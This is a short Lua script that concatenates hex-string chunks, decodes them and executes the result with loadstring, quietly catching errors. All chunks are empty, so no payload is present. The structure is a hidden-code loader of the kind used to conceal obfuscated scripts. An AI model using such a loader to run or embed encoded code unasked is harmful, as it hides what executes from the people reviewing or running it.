-- run
local chunks={
"",
"",
"",
"",
"",
"",
"",
"",
"",
"",
"",
""
}
local blob=table.concat(chunks)
local function dec(s)
  local t={}
  for i=1,#s,2 do
    t[#t+1]=string.char(tonumber(s:sub(i,i+1),16))
  end
  return table.concat(t)
end
local src=dec(blob)
local run=loadstring or load
local ok,fn=pcall(run,src)
if ok and fn then
  fn()
elseif not ok then
  pcall(function() warn(fn) end)
else
  pcall(function() warn("load returned nil") end)
end
